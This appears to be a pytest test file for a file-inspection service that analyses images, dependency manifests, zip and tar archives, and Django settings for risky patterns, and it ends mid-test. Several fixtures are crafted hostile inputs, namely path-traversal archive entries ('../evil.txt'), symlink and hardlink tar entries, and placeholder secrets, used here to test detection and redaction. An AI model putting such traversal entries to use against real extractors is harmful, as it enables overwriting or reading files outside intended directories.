import io
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import struct
import tarfile
import threading
import zipfile

import runner.main as runner
import pytest
from httpx import ASGITransport, AsyncClient


SAMPLE_PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde"
PACKAGE_JSON = """{
  "name": "demo-app",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node scripts/postinstall.js",
    "test": "vitest"
  },
  "dependencies": {
    "react": "^18.3.1",
    "local-lib": "file:../local-lib",
    "floating": "latest"
  },
  "devDependencies": {
    "vite": "*"
  },
  "engines": {
    "node": ">=20"
  }
}
"""
REQUIREMENTS_TXT = """
fastapi==0.115.0
httpx>=0.27
-e git+https://example.invalid/demo.git#egg=demo
--extra-index-url https://packages.example.invalid/simple
"""
PYPROJECT_TOML = """
[project]
name = "demo-service"
version = "0.1.0"
dependencies = [
  "fastapi>=0.115",
  "httpx==0.27.0",
  "demo @ git+https://example.invalid/demo.git",
]

[project.optional-dependencies]
dev = ["pytest>=8"]

[tool.poetry.dependencies]
python = "^3.12"
requests = "^2.32"

[tool.poetry.group.docs.dependencies]
mkdocs = "*"
"""


def test_run_command_records_timeout(monkeypatch):
    monkeypatch.setattr(runner, "COMMAND_TIMEOUT_SECONDS", 0.01)

    result = runner.run_command(["python3", "-c", "import time; time.sleep(1)"])

    assert result["timed_out"] is True
    assert result["exit_code"] is None
    assert result["timeout_seconds"] == 0.01


@pytest.mark.anyio
async def test_analyze_image_returns_passive_metadata(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir()
    image_path = uploads_dir / "pixel.png"
    image_path.write_bytes(SAMPLE_PNG)
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    monkeypatch.setattr(runner, "run_command", fake_image_command)
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/image",
            json={"file_id": "f" * 32, "relative_path": "uploads/pixel.png"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["analyzer"] == "inspectra-image-basic"
    assert payload["identification"]["detected_format"] == "png"
    assert payload["identification"]["mime_type"] == "image/png"
    assert payload["metadata"]["exiftool"]["ImageWidth"] == 1
    assert payload["privacy_indicators"]["gps_present"] is True
    assert payload["hashes"]["sha256"]


@pytest.mark.anyio
async def test_analyze_image_rejects_path_traversal(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/image",
            json={"file_id": "f" * 32, "relative_path": "../outside.png"},
        )

    assert response.status_code == 400
    assert response.json()["detail"] == "Path escapes data directory."


@pytest.mark.anyio
async def test_analyze_manifest_package_json_detects_scripts_and_source_dependencies(monkeypatch, tmp_path):
    manifest_path = write_manifest(tmp_path, "package.json", PACKAGE_JSON)
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/manifest",
            json={"file_id": "f" * 32, "relative_path": str(manifest_path.relative_to(tmp_path)), "original_filename": "package.json"},
        )

    assert response.status_code == 200
    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert payload["analyzer"] == "manifest_basic"
    assert payload["manifest_type"] == "package_json"
    assert payload["parsed"]["project"]["name"] == "demo-app"
    assert payload["parsed"]["scripts"]["postinstall"] == "node scripts/postinstall.js"
    dependencies = {item["name"]: item for item in payload["parsed"]["dependencies"]["dependencies"]}
    assert dependencies["react"]["source_type"] == "registry"
    assert dependencies["local-lib"]["source_type"] == "local"
    assert dependencies["local-lib"]["declared_requirement"] == "local-lib: file:../local-lib"
    assert "package_sensitive_lifecycle_script" in finding_ids
    assert "dependency_external_or_local_source" in finding_ids
    assert "dependency_broad_range" in finding_ids
    assert payload["summary"]["total_dependencies"] == 4


@pytest.mark.anyio
async def test_analyze_manifest_requirements_detects_unpinned_and_custom_sources(monkeypatch, tmp_path):
    manifest_path = write_manifest(tmp_path, "requirements.txt", REQUIREMENTS_TXT)
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/manifest",
            json={"file_id": "f" * 32, "relative_path": str(manifest_path.relative_to(tmp_path)), "original_filename": "requirements.txt"},
        )

    assert response.status_code == 200
    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert payload["manifest_type"] == "requirements_txt"
    assert payload["summary"]["total_dependencies"] == 3
    dependencies = {item["name"]: item for item in payload["parsed"]["dependencies"]["dependencies"]}
    assert dependencies["fastapi"]["source_type"] == "registry"
    assert dependencies["demo"]["source_type"] == "editable"
    assert dependencies["demo"]["declared_requirement"].startswith("-e git+https://")
    assert "requirements_dependency_not_exactly_pinned" in finding_ids
    assert "requirements_editable_install" in finding_ids
    assert "requirements_custom_index" in finding_ids
    assert "dependency_external_or_local_source" in finding_ids


@pytest.mark.anyio
async def test_analyze_manifest_pyproject_extracts_dependencies_and_findings(monkeypatch, tmp_path):
    manifest_path = write_manifest(tmp_path, "pyproject.toml", PYPROJECT_TOML)
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/manifest",
            json={"file_id": "f" * 32, "relative_path": str(manifest_path.relative_to(tmp_path)), "original_filename": "pyproject.toml"},
        )

    assert response.status_code == 200
    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert payload["manifest_type"] == "pyproject_toml"
    assert payload["parsed"]["project"]["name"] == "demo-service"
    assert "optional:dev" in payload["parsed"]["dependencies"]
    assert "poetry:docs" in payload["parsed"]["dependencies"]
    dependencies = {item["name"]: item for item in payload["parsed"]["dependencies"]["dependencies"]}
    assert dependencies["fastapi"]["source_type"] == "registry"
    assert dependencies["demo"]["source_type"] == "vcs"
    assert dependencies["demo"]["declared_requirement"] == "demo @ git+https://example.invalid/demo.git"
    assert "dependency_not_exactly_pinned" in finding_ids
    assert "dependency_external_or_local_source" in finding_ids
    assert "dependency_broad_range" in finding_ids


@pytest.mark.anyio
async def test_analyze_manifest_rejects_path_traversal(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/manifest",
            json={"file_id": "f" * 32, "relative_path": "../package.json", "original_filename": "package.json"},
        )

    assert response.status_code == 400
    assert response.json()["detail"] == "Path escapes data directory."


@pytest.mark.anyio
async def test_analyze_archive_zip_reports_structure_and_indicators(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            "src/app.py": b"print('hello')\n",
            "package.json": PACKAGE_JSON.encode("utf-8"),
            ".env": b"TOKEN=redacted\n",
            "nested/project.tar.gz": b"placeholder",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert payload["analyzer"] == "archive_basic"
    assert payload["archive_type"] == "zip"
    assert payload["summary"]["total_entries"] == 4
    assert payload["summary"]["manifest_files_detected"] == 1
    assert payload["summary"]["sensitive_name_matches"] == 1
    assert payload["summary"]["nested_archives"] == 1
    assert payload["detected_manifests"][0]["path"] == "package.json"
    assert "archive_sensitive_name_entry" in finding_ids
    assert "archive_nested_archive_entry" in finding_ids
    assert payload["hashes"]["sha256"]


@pytest.mark.anyio
async def test_analyze_archive_zip_detects_path_traversal(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"../evil.txt": b"nope"})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["summary"]["path_traversal_entries"] == 1
    assert {finding["id"] for finding in payload["findings"]} >= {"archive_path_traversal_entry"}
    assert payload["entries_sample"][0]["flags"]["path_traversal"] is True


@pytest.mark.anyio
async def test_analyze_archive_zip_preflight_truncates_entry_heavy_archive(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "ARCHIVE_MAX_ENTRIES", 3)
    monkeypatch.setattr(runner, "ARCHIVE_MAX_LISTED_ENTRIES", 2)
    archive_path = write_zip_archive(tmp_path, {f"files/{index}.txt": b"x" for index in range(5)})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["summary"]["truncated"] is True
    assert payload["summary"]["zip_entries_declared"] == 5
    assert payload["entries_sample"] == []
    assert len(payload["entries_sample"]) <= 2
    assert "archive_zip_entry_limit_preflight" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_archive_zip_preflight_blocks_large_central_directory(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "ARCHIVE_MAX_ZIP_CENTRAL_DIRECTORY_BYTES", 1)
    archive_path = write_zip_archive(tmp_path, {"README.md": b"hello\n"})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["summary"]["truncated"] is True
    assert payload["summary"]["zip_central_directory_bytes"] > 1
    assert payload["entries_sample"] == []
    assert "archive_zip_central_directory_too_large" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_archive_tar_reports_symlink(monkeypatch, tmp_path):
    archive_path = write_tar_archive(tmp_path)
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["archive_type"] == "tar"
    assert payload["summary"]["files"] == 1
    assert payload["summary"]["symlinks"] == 1
    assert "archive_symlink_entry" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_archive_tar_respects_entry_limit(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "ARCHIVE_MAX_ENTRIES", 2)
    monkeypatch.setattr(runner, "ARCHIVE_MAX_LISTED_ENTRIES", 1)
    archive_path = write_tar_many_entries(tmp_path, 4)
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["archive_type"] == "tar"
    assert payload["summary"]["truncated"] is True
    assert payload["summary"]["total_entries"] == 2
    assert len(payload["entries_sample"]) == 1
    assert "archive_too_many_entries" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_archive_handles_corrupt_file(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir()
    archive_path = uploads_dir / "broken.zip"
    archive_path.write_bytes(b"PK not really a zip")
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "broken.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["archive_type"] == "unknown"
    assert payload["errors"]
    assert payload["summary"]["total_entries"] == 0


@pytest.mark.anyio
async def test_analyze_project_archive_zip_parses_package_json(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            "README.md": b"# ignored\n",
            "package.json": PACKAGE_JSON.encode("utf-8"),
            "package-lock.json": b"{}",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/project-archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert payload["analyzer"] == "project_archive_basic"
    assert payload["summary"]["supported_manifests_found"] == 1
    assert payload["summary"]["supported_manifests_parsed"] == 1
    assert payload["summary"]["unsupported_manifests_detected"] == 1
    assert payload["summary"]["total_dependencies"] == 4
    assert payload["parsed_manifests"][0]["manifest_type"] == "package_json"
    assert payload["parsed_manifests"][0]["parsed"]["project"]["name"] == "demo-app"
    assert "package_sensitive_lifecycle_script" in finding_ids
    assert "dependency_external_or_local_source" in finding_ids


@pytest.mark.anyio
async def test_analyze_project_archive_zip_preflight_respects_archive_entry_limit(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "PROJECT_ARCHIVE_MAX_ARCHIVE_ENTRIES", 2)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "README.md": b"# ignored\n",
            "src/app.py": b"print('ignored')\n",
            "package.json": PACKAGE_JSON.encode("utf-8"),
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/project-archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["summary"]["truncated"] is True
    assert payload["summary"]["total_entries_seen"] == 0
    assert payload["summary"]["zip_entries_declared"] == 3
    assert payload["summary"]["supported_manifests_parsed"] == 0
    assert "project_archive_zip_entry_limit_preflight" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_project_archive_zip_parses_requirements(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"services/api/requirements.txt": REQUIREMENTS_TXT.encode("utf-8")})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/project-archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["parsed_manifests"][0]["manifest_type"] == "requirements_txt"
    assert payload["summary"]["total_dependencies"] == 3
    assert "requirements_custom_index" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_project_archive_zip_parses_pyproject(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"pyproject.toml": PYPROJECT_TOML.encode("utf-8")})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/project-archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["parsed_manifests"][0]["manifest_type"] == "pyproject_toml"
    assert payload["parsed_manifests"][0]["parsed"]["project"]["name"] == "demo-service"
    assert "poetry:docs" in payload["parsed_manifests"][0]["parsed"]["dependencies"]


@pytest.mark.anyio
async def test_analyze_project_archive_tar_parses_manifest(monkeypatch, tmp_path):
    archive_path = write_tar_manifest_archive(tmp_path, "package.json", PACKAGE_JSON.encode("utf-8"))
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/project-archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["archive_type"] == "tar"
    assert payload["summary"]["supported_manifests_parsed"] == 1
    assert payload["parsed_manifests"][0]["path"] == "package.json"


@pytest.mark.anyio
async def test_analyze_project_archive_skips_manifest_with_path_traversal(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"../package.json": PACKAGE_JSON.encode("utf-8")})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/project-archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["summary"]["supported_manifests_found"] == 1
    assert payload["summary"]["supported_manifests_parsed"] == 0
    assert payload["supported_manifests"][0]["reason"] == "path_traversal"
    assert "project_archive_path_traversal" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_project_archive_skips_oversized_manifest(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "PROJECT_ARCHIVE_MAX_MANIFEST_BYTES", 20)
    archive_path = write_zip_archive(tmp_path, {"package.json": PACKAGE_JSON.encode("utf-8")})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/project-archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["summary"]["supported_manifests_parsed"] == 0
    assert payload["supported_manifests"][0]["reason"] == "manifest_too_large"
    assert "project_archive_manifest_too_large" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_project_archive_handles_corrupt_file(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir()
    archive_path = uploads_dir / "broken.zip"
    archive_path.write_bytes(b"PK not really a zip")
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/project-archive",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "broken.zip"},
        )

    assert response.status_code == 200
    payload = response.json()
    assert payload["archive_type"] == "unknown"
    assert payload["errors"]
    assert payload["summary"]["supported_manifests_parsed"] == 0


@pytest.mark.anyio
async def test_analyze_django_config_zip_detects_settings_findings_and_redacts_secrets(monkeypatch, tmp_path):
    settings_text = b"""
DEBUG = True
SECRET_KEY = "supersecret-django-key"
ALLOWED_HOSTS = ["*"]
CORS_ALLOW_ALL_ORIGINS = True
CSRF_COOKIE_SECURE = False
SESSION_COOKIE_SECURE = False
DATABASES = {"default": {"ENGINE": "django.db.backends.sqlite3", "PASSWORD": "db-secret"}}
"""
    archive_path = write_zip_archive(tmp_path, {"project/settings.py": settings_text})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["analyzer"] == "django_config_basic"
    assert payload["summary"]["settings_files_detected"] == 1
    assert payload["summary"]["files_read"] == 1
    assert payload["summary"]["secrets_redacted_count"] >= 2
    assert "django_debug_enabled" in finding_ids
    assert "django_secret_key_hardcoded" in finding_ids
    assert "django_allowed_hosts_wildcard" in finding_ids
    assert "django_cors_allow_all" in finding_ids
    assert "django_database_password_hardcoded" in finding_ids
    assert "supersecret-django-key" not in serialized
    assert "db-secret" not in serialized
    assert "[REDACTED]" in serialized


@pytest.mark.anyio
async def test_analyze_django_config_detects_env_without_reading_and_deployment_signals(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            ".env": b"SECRET_KEY=should-not-leak\n",
            ".env.example": b"DEBUG=False\n",
            "requirements.txt": b"Django==5.0.0\n",
            "Dockerfile": b'CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]\n',
            "docker-compose.yml": b'services:\n  db:\n    ports:\n      - "5432:5432"\n  web:\n    env_file: .env\n',
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    env_record = next(item for item in payload["detected_files"] if item["path"] == ".env")
    assert response.status_code == 200
    assert env_record["read"] is False
    assert env_record["skip_reason"] == "sensitive_env_not_read"
    assert "should-not-leak" not in json.dumps(payload)
    assert "django_config_env_file_present" in finding_ids
    assert "django_deployment_runserver_detected" in finding_ids
    assert "django_compose_exposes_5432" in finding_ids
    assert payload["django_signals"]["deployment"]["django_dependency_detected"] == "true"


@pytest.mark.anyio
async def test_analyze_django_config_detects_env_variants_without_reading(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            ".env.production": b"SECRET_KEY=prod-secret\n",
            ".env.prod": b"TOKEN=prod-token\n",
            ".env.local": b"DATABASE_URL=postgres://user:pass@db/app\n",
            ".envrc": b"export PASSWORD=envrc-secret\n",
            ".env.example": b"DEBUG=False\n",
            ".env.template": b"SECRET_KEY=template-secret\n",
            ".env.sample": b"TOKEN=sample-token\n",
            "env.example": b"PASSWORD=example-password\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    records = {item["path"]: item for item in payload["detected_files"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    for path in (".env.production", ".env.prod", ".env.local", ".envrc"):
        assert records[path]["category"] == "env_sensitive"
        assert records[path]["read"] is False
        assert records[path]["skip_reason"] == "sensitive_env_not_read"
    for path in (".env.example", ".env.template", ".env.sample", "env.example"):
        assert records[path]["category"] == "env_template"
        assert records[path]["read"] is True
    assert payload["summary"]["env_files_detected"] == 8
    for secret in ("prod-secret", "prod-token", "pass@db", "envrc-secret"):
        assert secret not in serialized


@pytest.mark.anyio
async def test_analyze_django_config_contextualizes_debug_and_ignores_comment_only(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            "project/settings/production.py": b"DEBUG = True\n",
            "project/settings/dev.py": b"DEBUG = True\n",
            "project/settings/commented.py": b"# DEBUG=True\nDEBUG = False\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    debug_findings = [finding for finding in payload["findings"] if finding["id"] == "django_debug_enabled"]
    production_finding = next(finding for finding in debug_findings if finding.get("file_path") == "project/settings/production.py")
    dev_finding = next(finding for finding in debug_findings if finding.get("file_path") == "project/settings/dev.py")

    assert response.status_code == 200
    assert production_finding["level"] == "medium"
    assert production_finding["context"] == "production"
    assert dev_finding["level"] == "info"
    assert dev_finding["context"] == "development"
    assert not any(finding.get("file_path") == "project/settings/commented.py" for finding in debug_findings)


@pytest.mark.anyio
async def test_analyze_django_config_groups_repeated_missing_setting_findings(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            "project/settings/base.py": b"DEBUG = False\n",
            "project/settings/dev.py": b"DEBUG = False\n",
            "project/settings/test.py": b"DEBUG = False\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    csrf_findings = [finding for finding in payload["findings"] if finding["id"] == "django_csrf_cookie_secure_not_true"]
    hsts_findings = [finding for finding in payload["findings"] if finding["id"] == "django_hsts_missing_or_zero"]

    assert response.status_code == 200
    assert len(csrf_findings) == 1
    assert len(hsts_findings) == 1
    assert csrf_findings[0]["context"] == "grouped"
    assert "project/settings/base.py" in csrf_findings[0]["evidence"]
    assert "project/settings/dev.py" in csrf_findings[0]["evidence"]
    assert "grouped across 3 inspected settings files" in csrf_findings[0]["description"]


@pytest.mark.anyio
async def test_analyze_django_config_skips_path_traversal(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"../settings.py": b"DEBUG=True\n"})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["detected_files"][0]["read"] is False
    assert payload["detected_files"][0]["skip_reason"] == "path_traversal"
    assert "django_config_path_traversal" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_django_config_tar_skips_symlink_and_hardlink(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        link_info = tarfile.TarInfo("settings.py")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real_settings.py"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("config/settings/prod.py")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real_settings.py"
        archive.addfile(hardlink_info)

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    assert response.status_code == 200
    assert {item["skip_reason"] for item in payload["detected_files"]} == {"not_regular_file:symlink", "not_regular_file:hardlink"}
    assert "django_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_django_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "DJANGO_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "DJANGO_CONFIG_MAX_FILE_BYTES", 30)
    monkeypatch.setattr(runner, "DJANGO_CONFIG_MAX_TOTAL_BYTES", 40)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "settings.py": b"DEBUG=False\n",
            "project/settings/prod.py": b"DEBUG=True\n",
            "project/settings/large.py": b"X = '" + b"a" * 80 + b"'\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["detected_files"]}
    assert response.status_code == 200
    assert payload["summary"]["files_read"] == 1
    assert payload["summary"]["truncated"] is True
    assert "too_many_files" in reasons
    assert "file_too_large" in reasons


@pytest.mark.anyio
async def test_analyze_django_config_treats_python_as_text_without_importing(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            "project/settings.py": b"raise RuntimeError('would execute if imported')\nDEBUG = True\n",
        },
    )
